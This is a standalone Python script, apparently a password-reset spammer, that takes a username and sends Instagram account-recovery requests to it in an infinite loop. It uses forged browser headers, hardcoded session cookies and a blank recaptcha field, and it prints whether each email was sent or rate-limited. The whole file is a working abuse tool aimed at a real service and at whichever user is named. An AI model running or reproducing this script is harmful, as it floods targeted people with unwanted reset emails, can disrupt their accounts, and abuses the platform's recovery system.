import requests
username = input('Username: ')
req = requests.Session()

def reset():
    global att
    while True:
            headers = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US',
                'content-length': '80',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'ig_did=D9CDA615-475E-4FB1-9FF9-33FAEA225009; datr=CDVSYEQJuYzgvKRvyQYmTlB6; mid=YFI1QAABAAGwCsAiVs5O3duHTogU; ig_nrcb=1; shbid=396; shbts=1616580691.413183; rur=ASH; csrftoken=mcdRhvllk5LiAfQU6dOuBpbqyUy5XyZ9',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/password/reset/',
                'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': '(Linux; Android 5.0; iPhone Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Mobile Safari/537.36',
            }
            data = {
                'email_or_username': f'{username}',
                'recaptcha_challenge_field': '',
                'flow': '',
                'app_id': '',
                'source_account_id': ''
            }

            response = req.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data=data,
                              headers=headers).text
            if ('Email Sent') in response:
                print(f'Sent @{username}')
            elif ('No users found') in response:
                print('error')
            elif ('Please wait a few minutes before you try again') in response:
                print('Rate Limited')
            else:
                print(response)


reset()
